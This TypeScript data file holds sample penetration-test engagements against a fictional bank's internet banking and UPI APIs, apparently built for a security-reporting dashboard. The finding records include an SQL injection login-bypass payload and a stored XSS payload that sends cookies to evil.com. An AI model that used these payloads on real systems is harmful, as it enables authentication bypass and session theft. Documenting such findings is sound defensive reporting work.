import type { Engagement } from '@/types/offensive';

export const ENGAGEMENTS: Engagement[] = [
  {
    id: 'eng-001', name: 'Internet Banking External Test', code: 'PT-2025-003', type: 'External Penetration Test',
    status: 'active', scope: ['ibanking.gfs.com', 'api.gfs.com', 'GFS Mobile API endpoints'],
    objectives: ['Identify all externally exploitable vulnerabilities', 'Test authentication mechanisms', 'Assess data exposure risks', 'Test WAF effectiveness', 'Validate incident response capabilities'],
    rulesOfEngagement: ['Testing authorized by CISO Ananya Das — signed ROE', 'Testing window: 09:00–18:00 IST only', 'No denial of service attacks', 'No social engineering of real employees', 'All findings must be reported within 24 hours', 'Emergency contact: Suresh Reddy — +91 40 6600 1101'],
    targetAssets: ['ibanking.gfs.com', 'm.ibanking.gfs.com', 'api.gfs.com', 'auth.gfs.com'],
    attackSurface: ['Web application (HTTPS)', 'REST API endpoints', 'Mobile API', 'Authentication system', 'Session management', 'Input validation'],
    startDate: '2025-01-15', endDate: '2025-01-25', team: ['Nikhil Joshi', 'ShadowXLab Red Team'],
    severity: 'high',
    findings: [
      { id: 'f-001', title: 'SQL Injection on Internet Banking Login', severity: 'critical', cvss: 9.8, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', category: 'Injection', description: 'The login form is vulnerable to SQL injection via the username parameter. An attacker can bypass authentication or extract database contents.', impact: 'Full database access including 42 million customer records. Complete authentication bypass.', remediation: 'Implement parameterized queries. Deploy WAF SQL injection rule. Validate all inputs server-side.', affectedAsset: 'ibanking.gfs.com/login', proof: "POST /api/auth/login\n{\"username\":\"admin' OR '1'='1--\",\"password\":\"anything\"}\nResponse: 200 OK — Authentication bypassed", mitreMapping: ['T1190'], owaspMapping: ['A03:2021 — Injection'], pciDssMapping: ['6.5.1'], status: 'open' },
      { id: 'f-002', title: 'API Authentication Bypass on UPI Endpoints', severity: 'critical', cvss: 9.4, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', category: 'Broken Authentication', description: 'The UPI API endpoints can be accessed without authentication by removing the Authorization header.', impact: 'Unauthorized access to UPI transaction data and potential fund manipulation.', remediation: 'Enforce authentication on all API endpoints. Implement API gateway with mandatory auth checks.', affectedAsset: 'api.gfs.com/v2/upi/*', proof: 'GET /v2/upi/transactions — No auth header — Response: 200 with transaction data', mitreMapping: ['T1190'], owaspMapping: ['A07:2021 — Identification and Authentication Failures'], pciDssMapping: ['8.3.1'], status: 'open' },
      { id: 'f-003', title: 'Stored XSS in Account Statement', severity: 'high', cvss: 8.2, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N', category: 'Cross-Site Scripting', description: 'The account statement narration field renders user input as HTML without sanitization.', impact: 'Session hijacking, credential theft, or phishing when other users view the statement.', remediation: 'Implement Content Security Policy. Sanitize all user inputs. Encode output.', affectedAsset: 'ibanking.gfs.com/statements', proof: '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">', mitreMapping: ['T1189 Drive-by Compromise'], owaspMapping: ['A03:2021 — Injection'], pciDssMapping: ['6.5.7'], status: 'open' },
    ],
    evidence: ['SQL injection screenshots', 'API response captures', 'XSS payload execution screenshots', 'Burp Suite request/response logs'],
    executiveSummary: 'External penetration testing of GFS Internet Banking identified 3 critical and 2 high-severity vulnerabilities. The SQL injection on the login page is the most critical finding, as it could lead to complete database compromise. Immediate remediation is recommended for all critical findings.',
    methodology: ['OWASP Testing Guide v4.2', 'PTES (Penetration Testing Execution Standard)', 'NIST SP 800-115'],
  },
  {
    id: 'eng-002', name: 'UPI Gateway API Test', code: 'PT-2025-002', type: 'API Security Assessment',
    status: 'completed', scope: ['api.gfs.com/v2/upi/*', 'Merchant portal', 'Webhook endpoints'],
    objectives: ['Test API authentication and authorization', 'Validate rate limiting', 'Test for business logic flaws', 'Assess data exposure'],
    rulesOfEngagement: ['Testing authorized by CISO', 'No real transactions', 'Test data only'],
    targetAssets: ['api.gfs.com/v2/upi/*', 'merchant.gfs.com'],
    attackSurface: ['REST API', 'WebSocket endpoints', 'Webhook callbacks'],
    startDate: '2025-01-05', endDate: '2025-01-12', team: ['Nikhil Joshi', 'ShadowXLab Red Team'],
    severity: 'high',
    findings: [
      { id: 'f-010', title: 'Broken Object-Level Authorization (BOLA)', severity: 'critical', cvss: 9.1, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', category: 'Broken Object Level Authorization', description: 'Changing the account number in API requests allows access to other users transactions.', impact: 'Access to any customer\'s transaction history.', remediation: 'Validate object ownership for every API request.', affectedAsset: 'api.gfs.com/v2/upi/transactions/{accountId}', proof: 'GET /v2/upi/transactions/ACCOUNT-OTHER — 200 OK with other user data', mitreMapping: ['T1213'], owaspMapping: ['A01:2021 — Broken Access Control'], pciDssMapping: ['7.1'], status: 'remediation' },
    ],
    evidence: ['API testing logs', 'BOLA proof of concept', 'Burp Suite screenshots'],
    executiveSummary: 'API security assessment of UPI Gateway identified 1 critical finding (BOLA) and 11 additional vulnerabilities across authentication, rate limiting, and input validation.',
    methodology: ['OWASP API Security Top 10', 'OWASP Testing Guide'],
  },
];

export function getEngagement(id: string): Engagement | undefined {
  return ENGAGEMENTS.find((e) => e.id === id);
}
